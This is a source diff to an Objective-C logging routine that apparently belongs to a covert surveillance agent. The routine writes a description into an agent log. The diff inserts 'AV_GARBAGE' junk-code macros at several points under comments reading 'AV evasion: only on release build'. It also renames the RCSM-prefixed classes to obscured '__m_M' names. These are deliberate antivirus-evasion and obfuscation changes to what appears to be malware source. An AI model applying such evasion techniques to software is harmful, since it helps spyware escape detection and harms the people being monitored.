@@ -14,11 +14,15 @@
 #import "RCSMLogger.h"
 #import "RCSMDebug.h"
 
+#import "RCSMAVGarbage.h"
 
-@implementation RCSMInfoManager
+@implementation __m_MInfoManager
 
 - (BOOL)logActionWithDescription: (NSString *)description
-{
+{  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
+
   if (description == nil)
     {
 #ifdef DEBUG_INFO_MANAGER
@@ -26,21 +30,31 @@
 #endif
       return NO;
     }
-
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_001
+  
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
 
 #ifdef DEBUG_INFO_MANAGER
   infoLog(@"description: %@", description);
 #endif
 
-  RCSMLogManager *logManager = [RCSMLogManager sharedInstance];
+  __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
   
   BOOL success = [logManager createLog: LOG_INFO
                            agentHeader: nil
                              withLogID: 0];
 
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_002
+  
   if (success == TRUE)
-    {
+  { 
+    // AV evasion: only on release build
+    AV_GARBAGE_004
+    
       NSMutableData *logData = [[NSMutableData alloc] init];
       [logData appendData: [description dataUsingEncoding:
         NSUTF16LittleEndianStringEncoding]];
@@ -48,7 +62,10 @@
       [logManager writeDataToLog: logData
                         forAgent: LOG_INFO
                        withLogID: 0];
-
+      
+      // AV evasion: only on release build
+      AV_GARBAGE_003
+      
       [logManager closeActiveLog: LOG_INFO
                        withLogID: 0];
 
@@ -61,6 +78,9 @@
 #endif
       return NO;
     }
+  
+  // AV evasion: only on release build
+  AV_GARBAGE_000
   
   [outerPool release];
   return YES;
